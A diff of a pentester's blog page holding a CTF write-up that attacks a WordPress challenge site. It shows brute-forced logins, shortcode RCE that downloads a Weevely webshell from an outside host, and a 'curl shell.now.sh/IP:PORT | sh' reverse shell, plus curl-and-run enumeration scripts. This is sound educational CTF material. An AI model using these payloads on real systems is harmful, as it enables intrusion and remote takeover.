@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.62.0" />
+<meta name="generator" content="Hugo 0.72.0" />
 
   <meta property="og:title" content="[CTF - Santhacklaus-2019] Survivall" />
 <meta property="og:description" content="" />
@@ -37,6 +37,7 @@
   <link href="//use.fontawesome.com/releases/v5.6.3/css/all.css" rel="stylesheet">
   <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
   <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@500&display=swap" rel="stylesheet">
 
   
   <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
@@ -105,17 +106,17 @@
     <h1 class="brand-title">Thibaud Robin</h1>
     <h2 class="brand-tagline">Alias Th1b4ud</h2>
     <h2 class="brand-tagline">PENTESTER</h2>
-    <p>Personnal blog to speak about cybersecurity, technology and much more !</p>
+    <p>Personnal blog to speak about cybersecurity and Root-Me FAQ</p>
 
     <nav class="nav">
       <ul class="nav-list">
-        <li class="nav-item"><span class="nav-item-separator">//</span><a href="/">Home</a></li>
+        <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/">Home</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/whoami">WHOAMI</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/whoami">WHOAMI</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/writeups">WRITEUPS</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/writeups">WRITEUPS</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/articles">ARTICLES</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/articles">ARTICLES</a></li>
         
       </ul>
     </nav>
@@ -268,7 +269,7 @@ Service Info: Host: 172.20.0.3
     </p>
 </div>
 <p><img src="/img/santhacklaus-2019/wappalyzer.png" alt=""></p>
-<p>It's possible to obtain many informations with the public tool <strong>Wpscan</strong>.</p>
+<p>It&rsquo;s possible to obtain many informations with the public tool <strong>Wpscan</strong>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">[+] http://survive-all.santhacklaus.xyz/
  | Interesting Entries:
  |  - Server: Apache/2.4.38 (Debian)
@@ -329,9 +330,9 @@ Service Info: Host: 172.20.0.3
 <p>During the tests, I was not really satisfied by the result found. So I launched a bruteforce attack with the following wordlist to obtained more plugins : <a href="http://hacks.rocks/wp-content/uploads/2018/02/wp-plugins.txt">http://hacks.rocks/wp-content/uploads/2018/02/wp-plugins.txt</a></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc ~<span style="color:#f92672">]</span>$ ./wfuzz -w ~/dictionaries/wp-plugins.txt --hc <span style="color:#ae81ff">404</span> http://survive-all.santhacklaus.xyz/wp-content/plugins/FUZZ
 
-<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
+<span style="color:#f92672">===================================================================</span>
 ID           Response   Lines    Word     Chars       Payload                                            
-<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
+<span style="color:#f92672">===================================================================</span>
 
 000000071:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">293</span> Ch      <span style="color:#e6db74">&#34;akismet&#34;</span>                                          
 000000564:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">389</span> Ch      <span style="color:#e6db74">&#34;import-users-from-csv-with-meta&#34;</span>                  
@@ -347,7 +348,7 @@ ID           Response   Lines    Word     Chars       Payload
 000001252:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">378</span> Ch      <span style="color:#e6db74">&#34;woocommerce-services&#34;</span>                             
 000001328:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">370</span> Ch      <span style="color:#e6db74">&#34;wpforms-lite&#34;</span>                                     
 000001406:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">369</span> Ch      <span style="color:#e6db74">&#34;wp-rollback&#34;</span>                                      
-</code></pre></div><p>Great ! It's better. Theses plugins have been checked later.</p>
+</code></pre></div><p>Great ! It&rsquo;s better. Theses plugins have been checked later.</p>
 <h3 id="14-account-informations-gathering">1.4. Account informations gathering</h3>
 <p>A page on the application indicated somes usernames.</p>
 <p><img src="/img/santhacklaus-2019/screen-5-5.png" alt=""></p>
@@ -360,7 +361,7 @@ ID           Response   Lines    Word     Chars       Payload
 <p><a href="http://survive-all.santhacklaus.xyz/?p=142">http://survive-all.santhacklaus.xyz/?p=142</a></p>
 <h2 id="step-2--account-compromission">Step 2 : Account compromission</h2>
 <h3 id="21-users-enumeration">2.1. Users enumeration</h3>
-<p>Wordpress is vulnerable by default to users enumeration. However, wordpress developers replied that this is not a vulnerability. Let's prove them wrong !</p>
+<p>Wordpress is vulnerable by default to users enumeration. However, wordpress developers replied that this is not a vulnerability. Let&rsquo;s prove them wrong !</p>
 <p>First, it was possible to obtaine wordpress current users with the API : <a href="http://survive-all.santhacklaus.xyz/index.php?rest_route=/wp/v2/users">http://survive-all.santhacklaus.xyz/index.php?rest_route=/wp/v2/users</a></p>
 <div class="alert protips">
     <i class="logo fas fa-hand-holding-heart"></i>
@@ -393,8 +394,8 @@ j.yestin@cuttingedge.com
 
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">13</span>):
     <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2012</span>, <span style="color:#ae81ff">2020</span>):
-        password <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">@@</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> datetime<span style="color:#f92672">.</span>date(<span style="color:#ae81ff">2015</span>, i, <span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span>)
-        password <span style="color:#f92672">+</span><span style="color:#f92672">=</span> str(j) <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">@@</span><span style="color:#e6db74">&#34;</span>
+        password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;@@&#34;</span> <span style="color:#f92672">+</span> datetime<span style="color:#f92672">.</span>date(<span style="color:#ae81ff">2015</span>, i, <span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#39;%B&#39;</span>)
+        password <span style="color:#f92672">+=</span> str(j) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@@&#34;</span>
         <span style="color:#66d9ef">print</span>(password)
 </code></pre></div><p>And Burp Pro intruder did all the work !</p>
 <p><img src="/img/santhacklaus-2019/screen-9.png" alt=""></p>
@@ -429,17 +430,17 @@ Trying s.parker@cuttingedge.com / @@January2019@@ Time: 00:00:00 - (10 / 10) 100
 </code></pre></div><p><img src="/img/santhacklaus-2019/screen-16.png" alt=""></p>
 <p>Perfect ! So beautiful ! The remote server reached our computer. Our commands have been correctly executed.</p>
 <h3 id="31-webshell-creation">3.1. Webshell creation</h3>
-<p>The basic RCE was really unconfortable. So we've created a webshell with <strong>Weevely</strong> !</p>
+<p>The basic RCE was really unconfortable. So we&rsquo;ve created a webshell with <strong>Weevely</strong> !</p>
 <div class="alert protips">
     <i class="logo fas fa-hand-holding-heart"></i>
     <p class="text"><strong>ProTips</strong> : Weevely is a secured webshell designed for post-exploitation purposes. It&#39;s a tool naturally present on offensive distribution. More infos here : https://github.com/epinna/weevely3 
     
     </p>
 </div>
-<p>If you haven't develop your own webshell, you can use Weevely webshell project. No more reason to use c99 malware shell PLEASE (yeah please no more of this s**t !!!) :(</p>
+<p>If you haven&rsquo;t develop your own webshell, you can use Weevely webshell project. No more reason to use c99 malware shell PLEASE (yeah please no more of this s**t !!!) :(</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc weevely3<span style="color:#f92672">]</span>$ ./weevely.py generate teachunbequatreude_password agent.php
 Generated <span style="color:#e6db74">&#39;agent.php&#39;</span> with password <span style="color:#e6db74">&#39;teachunbequatreude_password&#39;</span> of <span style="color:#ae81ff">742</span> byte size.
-</code></pre></div><p>We generated a webshell <code>agent.php</code> with password : <code>teachunbequatreude_password</code> (yeah I know it's a weak password, have you tried it on the CTFd platform ? :D). All we have to do is to upload it.</p>
+</code></pre></div><p>We generated a webshell <code>agent.php</code> with password : <code>teachunbequatreude_password</code> (yeah I know it&rsquo;s a weak password, have you tried it on the CTFd platform ? :D). All we have to do is to upload it.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">[su_meta key=1 post_id=1 default=&#39;curl http://1.2.3.4:4444/agent.php -o wp-content/uploads/3e5t12e.php&#39; filter=&#39;system&#39;]
 </code></pre></div><p><img src="/img/santhacklaus-2019/screen-16-4.png" alt=""></p>
 <p>Done !</p>
@@ -456,7 +457,7 @@ Generated <span style="color:#e6db74">&#39;agent.php&#39;</span> with password <
 
 Weevely&gt; id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</code></pre></div><p>The power of this tool comes from all its features. On this challenge, normal reverse shell weren't working. With Weevely, you will not lost time to found a functionnal reverse shell : just use : <code>:backdoor_reversetcp</code> (yeah I know, this name s**k so much) :'(</p>
+</code></pre></div><p>The power of this tool comes from all its features. On this challenge, normal reverse shell weren&rsquo;t working. With Weevely, you will not lost time to found a functionnal reverse shell : just use : <code>:backdoor_reversetcp</code> (yeah I know, this name s**k so much) :'(</p>
 <p><img src="/img/santhacklaus-2019/screen-16-4-5.png" alt=""></p>
 <p>Weevely also have a module to enumerates suid/guid binaries to prepare your privilege escalation !</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">www-data@081256f7edc3:/var/www/html/wp-content/uploads $ :audit_suidsgid /
@@ -506,14 +507,14 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <span style="color:#75715e">?&gt;</span>
 </code></pre></div><p>Look at this l33t originality :D</p>
 <h3 id="33-reverse-shell">3.3. Reverse shell</h3>
-<p>With Weevely, we successfully obtained a nice reverse shell. For the exercice, we also checked classics reverse shell payloads but  they weren't working. In the end we still managed to get a reverse shell with perl payload.</p>
+<p>With Weevely, we successfully obtained a nice reverse shell. For the exercice, we also checked classics reverse shell payloads but  they weren&rsquo;t working. In the end we still managed to get a reverse shell with perl payload.</p>
 <div class="alert protips">
     <i class="logo fas fa-hand-holding-heart"></i>
     <p class="text"><strong>ProTips</strong> : In the objective to optimise your post exploitation time, I advise you to use shell.now.sh, an automated reverse shell tool : https://github.com/lukechilds/reverse-shell 
     
     </p>
 </div>
-<p><code>shell.now.sh</code> is a reverse shell provider tool. It's really simple to use : <code>curl https://shell.now.sh/&lt;IP&gt;:&lt;PORT&gt; | sh</code></p>
+<p><code>shell.now.sh</code> is a reverse shell provider tool. It&rsquo;s really simple to use : <code>curl https://shell.now.sh/&lt;IP&gt;:&lt;PORT&gt; | sh</code></p>
 <p>Final paylod : <code>http://survive-all.santhacklaus.xyz/wp-content/uploads/3e5t12e.php?cmd=curl https://shell.now.sh/1.2.3.4:4444 | sh</code></p>
 <p><img src="/img/santhacklaus-2019/screen-16-5.png" alt=""></p>
 <p>If you are curious, here is the original payload :</p>
@@ -536,7 +537,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <p>Here is a one liner to easily past during your penetration test :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&#34;</span> -Lo lse.sh;chmod <span style="color:#ae81ff">700</span> lse.sh; ./lse.sh; curl <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&#34;</span> -Lo LinEnum.sh; chmod <span style="color:#ae81ff">700</span> LinEnum.sh; ./LinEnum.sh -r report.txt -e /var/tmp/ -t
 </code></pre></div><p>In our privilege escalation researches, we localised strange binarie with setuid bit : <code>/opt/gather_todos_wrapper</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@081256f7edc3:/ $ find / -user root -perm -4000 -exec ls -ldb <span style="color:#f92672">{</span><span style="color:#f92672">}</span> <span style="color:#ae81ff">\;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@081256f7edc3:/ $ find / -user root -perm -4000 -exec ls -ldb <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span>
 
 -rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">63736</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2018</span> /usr/bin/passwd
 -rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">84016</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2018</span> /usr/bin/gpasswd
